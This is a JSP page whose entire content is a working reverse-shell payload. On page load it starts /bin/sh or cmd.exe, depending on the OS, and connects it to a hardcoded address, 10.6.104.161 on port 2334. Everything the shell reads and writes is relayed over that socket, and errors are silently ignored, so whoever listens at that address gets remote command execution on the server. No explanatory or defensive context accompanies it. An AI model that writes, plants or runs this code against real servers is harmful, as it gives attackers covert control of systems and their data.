<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream xz;
    OutputStream nf;

    StreamConnector( InputStream xz, OutputStream nf )
    {
      this.xz = xz;
      this.nf = nf;
    }

    public void run()
    {
      BufferedReader sz  = null;
      BufferedWriter rfk = null;
      try
      {
        sz  = new BufferedReader( new InputStreamReader( this.xz ) );
        rfk = new BufferedWriter( new OutputStreamWriter( this.nf ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = sz.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rfk.write( buffer, 0, length );
          rfk.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( sz != null )
          sz.close();
        if( rfk != null )
          rfk.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.6.104.161", 2334 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
